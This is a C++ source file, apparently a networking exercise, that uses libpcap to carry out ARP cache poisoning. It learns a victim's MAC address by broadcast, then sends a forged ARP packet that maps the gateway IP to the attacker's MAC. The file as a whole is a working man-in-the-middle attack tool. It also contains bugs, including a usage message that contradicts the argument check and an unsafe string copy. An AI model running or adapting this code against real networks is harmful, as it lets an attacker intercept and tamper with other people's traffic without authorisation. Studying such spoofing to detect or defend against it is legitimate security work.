#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <stdio.h> 
#include <string.h> 
#include <unistd.h> 
#include <stdlib.h> 
#include <netinet/ether.h> 
#include <net/if.h> 
#include <sys/ioctl.h> 
#include <string>
#include <arpa/inet.h>

#define MAC_ALEN 6


#pragma pack(push, 1)
struct EthArpPacket final
{
	EthHdr eth_;
	ArpHdr arp_;
};

#pragma pack(pop)

void usage()
{
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int get_mac_address(char *ifname, uint8_t *mac_addr, char *sip){
	struct ifreq ifr;
	struct sockaddr_in sin;
	int sockfd, ret;

	sockfd = socket(AF_INET,SOCK_DGRAM,0);
	if(sockfd <0){
		puts("fail");
		return -1;
	}
	

	strcpy(ifr.ifr_name, ifname);
	ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
	if(ret<0){
		puts("fail");
		close(sockfd);
		return -1;
	}

	memcpy(mac_addr,ifr.ifr_hwaddr.sa_data,MAC_ALEN);


	if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0)
	{ // get eth0 ip
		perror("ioctl error");
		return -1;
	}
	memcpy(&sin,&ifr.ifr_addr,sizeof(sin));
	strncpy(sip,inet_ntoa(sin.sin_addr),sizeof(inet_ntoa(sin.sin_addr))+10);


	close(sockfd);

	return 0;
}

int main(int argc, char *argv[])
{
	if (argc != 4)
	{
		usage();
		return -1;
	}

	char *dev = argv[1];
	char *vip = argv[2];
	char *gip = argv[3];
	char sip[50]={0,};

	char aMAC[6];
	char AMAC[18]={0,};
	char vMAC[6];
	char VMAC[18]={0,};

	// bpf_u_int32 net_ip;               
	// bpf_u_int32 mask;	
	
	// struct in_addr net_addr, mask_addr;
	// if (pcap_lookupnet(dev, &net_ip, &mask, errbuf) < 0)
	// {
	// 	printf("%s\n", errbuf);
	// 	return 2;
	// } 
	// net_addr.s_addr = net_ip;
	// mask_addr.s_addr = mask;

	// printf("net ip : %s\n", inet_ntoa(net_addr));
	// printf("mask : %s\n", inet_ntoa(mask_addr));

	//GET ATTACK MAC
	get_mac_address(dev,(uint8_t *)aMAC,sip);

	printf("MY IP : %s\n",sip);
	printf("MY MAC Address: ");
	int k=0;
	for (int i = 0; i < 6; i++)
	{
		sprintf(&AMAC[k],"%02x", aMAC[i]);
		k = k+2;
		if (i != 5)
		{
			AMAC[k++] = ':';
		}
	}
	AMAC[k++]='\0';
	printf("%s\n",AMAC);
	//DONE


	char errbuf[PCAP_ERRBUF_SIZE];
	// pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

	if (handle == nullptr)
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	//GET VICTIM MAC
	EthArpPacket broad;
	broad.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF"); // victim의 MAC주소
	broad.eth_.smac_ = Mac(AMAC); // src의 MAC주소
	broad.eth_.type_ = htons(EthHdr::Arp);

	broad.arp_.hrd_ = htons(ArpHdr::ETHER);
	broad.arp_.pro_ = htons(EthHdr::Ip4);
	broad.arp_.hln_ = Mac::SIZE;
	broad.arp_.pln_ = Ip::SIZE;
	broad.arp_.op_ = htons(ArpHdr::Request);
	broad.arp_.smac_ = Mac(AMAC);
	broad.arp_.sip_ = htonl(Ip(sip)); // src의 ip주소
	broad.arp_.tmac_ = Mac("00:00:00:00:00:00");
	broad.arp_.tip_ = htonl(Ip(vip)); // victim의 ip 주소

	int res0 = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&broad), sizeof(EthArpPacket));
	if (res0 != 0)
	{
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res0, pcap_geterr(handle));
	}

	while (1)
	{
		struct pcap_pkthdr *header;
		const u_char *p;
		int res = pcap_next_ex(handle, &header, &p);
		if (res == 0)
			continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
		{
			puts("fail");
			pcap_close(handle);
			return -1;
		}

		struct EthHdr *eth_hdr = (struct EthHdr *)p;
		if (ntohs(eth_hdr->type_) == EthHdr::Arp)
		{
			struct ArpHdr *arp_hdr = (struct ArpHdr *)(p + sizeof(struct EthHdr));
			if (Mac(AMAC) == arp_hdr->tmac_)
			{
				if (ntohs(arp_hdr->op_) == ArpHdr::Reply)
				{
					sprintf(VMAC, "%02x", ((uint8_t *)arp_hdr->smac_)[0]);
					for (int i = 0; i < 5; i++)
						sprintf((VMAC + 2) + 3 * i, ":%02x", ((uint8_t *)arp_hdr->smac_)[i + 1]);
					break;
				}
			}
		}
	}

	printf("Victim MAC : %s",VMAC);

	EthArpPacket packet;

	packet.eth_.dmac_ = Mac(VMAC); // victim의 MAC주소
	packet.eth_.smac_ = Mac(AMAC); // src의 MAC주소
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(AMAC);
	packet.arp_.sip_ = htonl(Ip(gip)); // src의 ip주소
	packet.arp_.tmac_ = Mac(VMAC);
	packet.arp_.tip_ = htonl(Ip(vip)); // victim의 ip 주소


	int res1 = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
	if (res1 != 0)
	{
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res1, pcap_geterr(handle));
	}
	printf("1");

	pcap_close(handle);
}


